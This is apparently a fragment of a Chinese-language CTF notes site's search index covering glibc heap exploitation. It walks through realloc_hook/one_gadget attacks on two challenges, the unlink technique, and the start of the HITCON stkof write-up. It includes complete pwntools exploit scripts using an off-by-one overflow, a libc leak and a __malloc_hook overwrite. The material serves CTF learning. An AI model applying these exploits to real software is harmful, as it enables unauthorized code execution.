\u6cc4\u9732 libc \u5730\u5740\u540e\uff0c\u5c06 bin \u4e2d\u5269\u4f59\u5185\u5b58\u7533\u8bf7\u51fa\u6765\uff0c\u8be5\u6307\u9488\u4e0e chunk2 \u6307\u5411\u76f8\u540c\u5730\u5740\uff0c\u4efb\u9009\u5176\u4e00\u91ca\u653e\uff0c\u518d\u7528\u53e6\u5916\u4e00\u4e2a\u4fee\u6539 fastbin fd \u6307\u9488\uff1a create ( 0x68 , 'skye' ) #4 free ( 4 ) payload = p64 ( malloc_hook - 27 - 8 ) + ' \\n ' edit ( 2 , payload ) \u6b63\u5e38\u6765\u8bf4\u5c06 malloc_hook \u52ab\u6301\u4e3a onegadget \u5373\u53ef\uff0c\u4f46\u662f\u6d4b\u8bd5\u53d1\u73b0\u8fd9\u6761\u9898\u76ee\u7684\u6808\u73af\u5883\u4e0d\u6ee1\u8db3\u5168\u90e8 onegadget \u6761\u4ef6\uff0c\u8fd9\u5c31\u9700\u8981\u8c03\u6574\u9635\u7ed3\u6784\uff0c\u4f7f onegadget \u751f\u6548\u3002 \u9700\u8981\u914d\u5408\u4f7f\u7528 realloc_hook \u548c malloc_hook\u3002 \u5c06 malloc_hook \u52ab\u6301\u4e3a realloc \uff0crealloc_hook \u52ab\u6301\u4e3a onegadget \u3002\u7136\u540e\u901a\u8fc7\u591a\u6b21\u5c1d\u8bd5\u786e\u5b9a\u504f\u79fb\u4e3a 12 \u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/realloc/#exp","text":"from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./vn_pwn_simpleHeap\" ) # p = remote(\"node3.buuoj.cn\",29864) elf = ELF ( \"./vn_pwn_simpleHeap\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) # libc = ELF(\"./libc-2.23.so\") def create ( size , content ): p . sendlineafter ( \"choice: \" , '1' ) p . sendlineafter ( '?' , str ( size )) p . sendafter ( ':' , content ) def edit ( id , content ): p . sendlineafter ( \"choice: \" , '2' ) p . sendlineafter ( '?' , str ( id )) p . sendafter ( ':' , content ) def show ( id ): p . sendlineafter ( \"choice: \" , '3' ) p . sendlineafter ( '?' , str ( id )) def free ( id ): p . sendlineafter ( \"choice: \" , '4' ) p . sendlineafter ( '?' , str ( id )) create ( 0x18 , 's' ) create ( 0x48 , 'k' ) create ( 0x68 , 'y' ) #2 create ( 0x10 , 'e' ) payload = 'a' * 0x18 + ' \\xc1 ' edit ( 0 , payload ) free ( 1 ) create ( 0x48 , 'yyds' ) show ( 2 ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_base = leak_addr - 0x3c4b78 malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc_hook = libc_base + libc . sym [ '__realloc_hook' ] log . info ( \"realloc_hook:\" + hex ( realloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] log . info ( \"realloc:\" + hex ( realloc )) create ( 0x68 , 'skye' ) #4 free ( 4 ) payload = p64 ( malloc_hook - 27 - 8 ) + ' \\n ' edit ( 2 , payload ) create ( 0x68 , 'a' ) create ( 0x68 , 'b' ) #5 one = [ 0x45226 , 0x4527a , 0xf0364 , 0xf1207 ] # one = [0x45216,0x4526a,0xf02a4,0xf1147] onegadget = libc_base + one [ 1 ] log . info ( \"one:\" + hex ( onegadget )) payload = 'a' * 11 + p64 ( onegadget ) + p64 ( realloc + 12 ) + ' \\n ' edit ( 5 , payload ) gdb . attach ( p ) # create(0x10,'skye,yyds') p . sendlineafter ( \"choice: \" , '1' ) p . sendlineafter ( '?' , str ( 0x10 )) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/realloc/#roarctf_2019_easy_pwn","text":"","title":"roarctf_2019_easy_pwn"},{"location":"Pwn/glibc-heap/realloc/#_5","text":"\u4e00\u4e2a\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002\u6240\u6709\u529f\u80fd\u90fd\u662f\u57fa\u4e8e\u5217\u8868\u7684\u4e0b\u6807\u5b9a\u4f4d\u64cd\u4f5c\u5bf9\u8c61\u3002\u7528 3 \u4e2a\u5217\u8868\u7ef4\u62a4\u5806\uff1achunk_inuse\u3001chunk_size\u3001chunk_ptr\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/realloc/#_6","text":"\u5728 edit \u529f\u80fd\u91cc\u9762 sub_E26 \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5904\u7406\u8f93\u5165\u957f\u5ea6\u7684\uff0c\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff1a __int64 __fastcall check_size ( signed int size , unsigned int input_length ) { __int64 result ; // rax if ( size > ( signed int ) input_length ) return input_length ; if ( input_length - size == 10 ) LODWORD ( result ) = size + 1 ; //off by one else LODWORD ( result ) = size ; return ( unsigned int ) result ; } \u5f53\u6211\u4eec\u8981\u6c42\u5199\u5165\u7684\u957f\u5ea6\uff08input_length\uff09\u5927\u4e8e\u5806 size 10 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u53ef\u4ee5\u5199\u5165 size + 1 \u5b57\u8282\uff0c\u9020\u6210 off by one \u3002","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/realloc/#_7","text":"\u8fd9\u6761\u9898\u76ee\u548c [V&N2020 \u516c\u5f00\u8d5b]simpleHeap \u601d\u8def\u4e00\u6837\u3002 \u4f7f\u7528 off by one \u4f2a\u9020 chunk size\uff0c\u9020\u6210 chunk extend \uff0c\u518d\u5229\u7528 unsorted bin \u7684\u7279\u70b9\uff0c\u6cc4\u9732\u51fa unsorted bin fd \u6307\u9488\u7684 libc \u5730\u5740\u3002 \u5c06\u4e0a\u4e00\u6b65\u4e2d\u7684 chunk extend \u5269\u4e0b\u5728 bin \u4e2d\u7684\u5185\u5b58\u7533\u8bf7\u51fa\u6765\uff0c\u9020\u6210\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\uff0c\u914d\u5408 edit \u529f\u80fd\u5b9e\u73b0 houst of spirit \uff0c\u52ab\u6301 __malloc_hook \u3002 \u5b9e\u9645\u6d4b\u8bd5\u540e\u5168\u90e8 onegadget \u56e0\u4e3a\u6808\u73af\u5883\u95ee\u9898\u90fd\u65e0\u6cd5\u6253\u901a\uff0c\u9700\u8981\u7ed3\u5408 malloc_hook \u3001 realloc_hook \u8c03\u6574\u6808\u73af\u5883\u624d\u80fd\u6253\u901a\u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/realloc/#exp_1","text":"from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./roarctf_2019_easy_pwn\") p = remote ( \"node3.buuoj.cn\" , 29259 ) elf = ELF ( \"./roarctf_2019_easy_pwn\" ) libc = ELF ( \"./libc-2.23.so\" ) # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") def create ( size ): p . recvuntil ( \"choice: \" ) p . sendline ( \"1\" ) p . recvuntil ( \": \" ) p . sendline ( str ( size )) def edit ( index , size , content ): p . recvuntil ( \"choice: \" ) p . sendline ( \"2\" ) p . recvuntil ( \": \" ) p . sendline ( str ( index )) p . recvuntil ( \": \" ) p . sendline ( str ( size )) p . recvuntil ( \": \" ) p . send ( content ) def free ( index ): p . recvuntil ( \": \" ) p . sendline ( \"3\" ) p . recvuntil ( \": \" ) p . sendline ( str ( index )) def show ( index ): p . recvuntil ( \": \" ) p . sendline ( \"4\" ) p . recvuntil ( \": \" ) p . sendline ( str ( index )) create ( 0x18 ) #overwrite create ( 0x68 ) create ( 0x68 ) #2 create ( 0x10 ) #protect payload = 'a' * 0x18 + ' \\xe1 ' edit ( 0 , len ( payload ) - 1 + 10 , payload ) free ( 1 ) create ( 0x68 ) show ( 2 ) p . recvuntil ( \"content: \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_base = leak_addr - 0x3c4b78 malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] log . info ( \"realloc:\" + hex ( realloc )) realloc_hook = libc_base + libc . sym [ '__realloc_hook' ] log . info ( \"realloc_hook:\" + hex ( realloc_hook )) create ( 0x68 ) free ( 4 ) payload = p64 ( malloc_hook - 27 - 8 ) edit ( 2 , len ( payload ), payload ) create ( 0x68 ) create ( 0x68 ) # one = [0x45226,0x4527a,0xf0364,0xf1207] one = [ 0x45216 , 0x4526a , 0xf02a4 , 0xf1147 ] onegadget = libc_base + one [ 1 ] log . info ( \"onegadget:\" + hex ( onegadget )) payload = 'a' * 11 + p64 ( onegadget ) + p64 ( realloc ) edit ( 5 , len ( payload ), payload ) create ( 0x10 ) # gdb.attach(p) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/realloc/#_8","text":"[\u539f\u521b]\u5806\u7684\u516d\u79cd\u5229\u7528\u624b\u6cd5 [pwn]\u5806\uff1arealloc_hook\u63a7\u5236\u6808\u7ed3\u6784\u8fbe\u6210onegadget pwn\u5b66\u4e60\u7cfb\u5217\u4e4bExtend the chunk\u53carealloc_hook\u5229\u7528","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/glibc-heap/unlink/","text":"Unlink \u00b6 \u539f\u7406 \u00b6 \u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9 chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002 \u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff08\u4f8b\u5982 free \u65f6\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\uff09\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b \u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002 \u53e4\u8001\u7684 unlink \u00b6 \u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9 chunk \u7684 size \u68c0\u67e5\u548c\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u5373\u6ca1\u6709\u5982\u4e0b\u68c0\u67e5\u4ee3\u7801\u3002 // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4(size\u68c0\u67e5) if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ // \u68c0\u67e5 fd \u548c bk \u6307\u9488(\u53cc\u5411\u94fe\u8868\u5b8c\u6574\u6027\u68c0\u67e5) if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // largebin \u4e2d next_size \u53cc\u5411\u94fe\u8868\u5b8c\u6574\u6027\u68c0\u67e5 if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b \uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50 \u73b0\u5728\u6709\u7269\u7406\u7a7a\u95f4\u8fde\u7eed\u7684\u4e24\u4e2a chunk\uff08Q\uff0cNextchunk\uff09\uff0c\u5176\u4e2d Q \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u3001Nextchunk \u5904\u4e8e\u91ca\u653e\u72b6\u6001\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08 \u6bd4\u5982\u6ea2\u51fa \uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eec free(Q) \u65f6 glibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk \u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76 \u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76 \u7ee7\u800c\u5bf9 Nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c \u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b FD=P->fd = target addr -12 BK=P->bk = expect value FD->bk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value BK->fd = FD\uff0c\u5373 *(expect value +8) = FD = target addr-12 \u603b\u7ed3\uff1a // \u4f7f\u7528\u524d\u63d0\uff1a\u4f7f\u7528\u4f20\u5165\u53c2\u6570 P -> fd = target -12 ; P -> bk = expect value ; // \u4f5c\u7528\u6548\u679c\uff1a // target addr \u8986\u5199\u4e3a expect value * ( target addr ) = expect value ; // expect value \u8986\u5199\u4e3a target addr -12 * ( expect value + 8 ) = target addr -12 ; \u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002 \u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002 \u5f53\u524d\u7684 unlink \u00b6 **\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002**\u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5 // fd bk // FD\u7684\u4e0b\u4e00\u4e2achunk\u662f\u5426\u4e3aP\uff1bBK\u7684\u4e0a\u4e00\u4e2achunk\u662f\u5426\u4e3aP\uff1b if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ \u5047\u5982\u6b64\u65f6 FD\u3001BK \u6307\u9488\u5185\u5bb9\u4e3a\uff1a FD->bk = target addr - 12 + 12=target_addr BK->fd = expect value + 8 \u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31 ~\u53ef\u80fd ~\u4e0d\u53ef\u7528\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f2a\u9020\u7684\u65b9\u5f0f\u7ed5\u8fc7\u8fd9\u4e2a\u673a\u5236\u3002 \u9996\u5148\u6211\u4eec\u901a\u8fc7\u8986\u76d6\uff0c\u5c06 nextchunk \u7684 FD \u6307\u9488\u6307\u5411\u4e86 fakeFD\uff0c\u5c06 nextchunk \u7684 BK \u6307\u9488\u6307\u5411\u4e86 fakeBK \u3002\u90a3\u4e48\u4e3a\u4e86\u901a\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u9700\u8981 fakeFD -> bk == P <=> *(fakeFD + 12) == P \u524d\u4e00\u4e2a chunk bk \u6307\u5411 P fakeBK -> fd == P <=> *(fakeBK + 8) == P \u540e\u4e00\u4e2a chunk fd \u6307\u5411 P \u5f53\u6ee1\u8db3\u4e0a\u8ff0\u4e24\u5f0f\u65f6\uff0c\u53ef\u4ee5\u8fdb\u5165 Unlink \u7684\u73af\u8282\uff0c\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a fakeFD -> bk = fakeBK <=> *(fakeFD + 12) = fakeBK \u524d\u4e00\u4e2a chunk bk \u66f4\u65b0\u4e3a\u540e\u4e00\u4e2a chunk \u5730\u5740 fakeBK -> fd = fakeFD <=> *(fakeBK + 8) = fakeFD \u540e\u4e00\u4e2a chunk fd \u66f4\u65b0\u4e3a\u524d\u4e00\u4e2a chunk \u5730\u5740 \u5c0f\u7ed3 // \u89c4\u907f\u68c0\u67e5\u4f2a\u9020\u6761\u4ef6 // fakeFD == P->fd; fakeBK == P->bk; * ( fakeFD + 12 ) == P ; * ( fakeBK + 8 ) == P ; // unlink \u7ed3\u679c * ( fakeFD + 12 ) = fakeBK ; * ( fakeBK + 8 ) = fakeFD ; \u5982\u679c\u8ba9 fakeFD + 12 \u548c fakeBK + 8 \u6307\u5411\u540c\u4e00\u4e2a\u6307\u5411 P \u7684\u6307\u9488\uff0c\u90a3\u4e48\uff1a // fakeFD + 12 = P; fakeBK + 8 = P; * ( fakeFD + 12 ) = * P = fakeBK = P - 8 ; * ( fakeBK + 8 ) = * P = fakeFD = P - 12 ; \u5316\u7b80\u540e unlink \u7ed3\u679c\u4e3a\uff1a *P = P - 8 *P = P - 12 \u5373\u901a\u8fc7\u6b64\u65b9\u5f0f\uff0c P \u7684\u6307\u9488\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904 \u3002\u6b64\u65b9\u6cd5\u867d\u7136\u4e0d\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u4f46\u662f\u53ef\u4ee5\u4fee\u6539\u6307\u5411 chunk \u7684\u6307\u9488\uff0c\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002 \u8fd9\u91cc\u6307\u7684\u4f4e 12 \u662f\u5728 32 \u4f4d\u7cfb\u7edf\u4e0b\uff0c\u5982\u679c\u662f 64 \u4f4d\u7cfb\u7edf\u5c31\u662f 3*8 = 24 \u3002 \u5f52\u7eb3\u8d77\u6765\u5c31\u662f**\u5c06 P \u6307\u9488\u6307\u5411\u6bd4 P \u4f4e 3 \u4e2a\u673a\u5668\u5468\u671f\u7684\u5730\u5740\u5904** \u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\uff0c\u56e0\u4e3a P \u5728 Unlink \u524d\u662f\u6307\u5411\u6b63\u786e\u7684 chunk \u7684\u6307\u9488\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 // \u5224\u65ad\u5f53\u524d\u5927\u5c0f chunksize \u4e0e nextchunk \u7684 prev_size \u8bb0\u5f55\u503c\u662f\u5426\u4e00\u81f4 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6e next chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002 \u5229\u7528\u601d\u8def \u00b6 \u6761\u4ef6 \u00b6 UAF \uff0c\u53ef\u4fee\u6539 free \u72b6\u6001\u4e0b smallbin \u6216\u662f unsorted bin \u7684 fd \u548c bk \u6307\u9488 \u5df2\u77e5\u4f4d\u7f6e\u5b58\u5728\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53ef\u8fdb\u884c UAF \u7684 chunk \u6548\u679c \u00b6 \u4f7f\u5f97\u5df2\u6307\u5411 UAF chunk \u7684\u6307\u9488 ptr \u53d8\u4e3a ptr - 0x18 \u601d\u8def \u00b6 \u8bbe\u6307\u5411\u53ef UAF chunk \u7684\u6307\u9488\u7684\u5730\u5740\u4e3a ptr \u4fee\u6539 fd \u4e3a ptr - 0x18 \u4fee\u6539 bk \u4e3a ptr - 0x10 \u89e6\u53d1 unlink ptr \u5904\u7684\u6307\u9488\u4f1a\u53d8\u4e3a ptr - 0x18\u3002 2014 HITCON stkof \u00b6 \u505a\u9898\u73af\u5883\uff1aUbuntu 16.04 \u57fa\u672c\u4fe1\u606f \u00b6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked \u7a0b\u5e8f\u5b58\u5728 4 \u4e2a\u529f\u80fd\uff0c\u7ecf\u8fc7 IDA \u5206\u6790\u540e\u53ef\u4ee5\u5206\u6790\u529f\u80fd\u5982\u4e0b alloc\uff1a\u8f93\u5165 size\uff0c\u5206\u914d size \u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728 bss \u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3a global fill\uff1a\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u5411\u5206\u914d\u7684\u5185\u5b58\u5904\u8bfb\u5165\u6570\u636e\uff0c\u6570\u636e\u957f\u5ea6\u53ef\u63a7\uff0c \u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5 free_chunk\uff1a\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757 print\uff1a\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa \u6f0f\u6d1e\u51fd\u6570 \u00b6 fiil \u5199\u5165\u5b57\u7b26\u957f\u5ea6\u662f\u7531\u7528\u6237\u51b3\u5b9a\u7684\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e00\u4e2a\u5806\u6ea2\u51fa\u3002 idx = atol ( & s ); if ( idx > 0x100000 ) return 0xFFFFFFFFLL ; if ( ! globals [ idx ] ) return 0xFFFFFFFFLL ; fgets ( & s , 16 , stdin ); size = atoll ( & s ); ptr = globals [ idx ]; IO \u7f13\u51b2\u533a\u95ee\u9898\u5206\u6790 \u00b6 \u8fd9\u6761\u9898\u76ee\u5806\u7a7a\u95f4\u4e00\u5f00\u59cb\u53ef\u80fd\u548c\u6211\u4eec\u60f3\u8c61\u7684\u4e0d\u4e00\u6837\uff0c\u8fd9\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a 1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b\u3002 \u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc \u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002 *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd860 \u25c2\u2014 0x16 *R8 0x1 *R9 0x0 *R10 0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700 *R11 0x246 *R12 0xa *R13 0x9 R14 0x0 *R15 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RBP 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RSP 0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd18e0> ...\uff0c\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a8769c _IO_file_underflow+508 f 4 7ffff7a8860e _IO_default_uflow+14 f 5 7ffff7a7bc6a _IO_getline_info+170 f 6 7ffff7a7bd78 f 7 7ffff7a7ab7d fgets+173 f 8 400d2e f 9 7ffff7a2d830 __libc_start_main+240 \u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05410 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 PREV_INUSE { prev_size = 0, size = 134129, 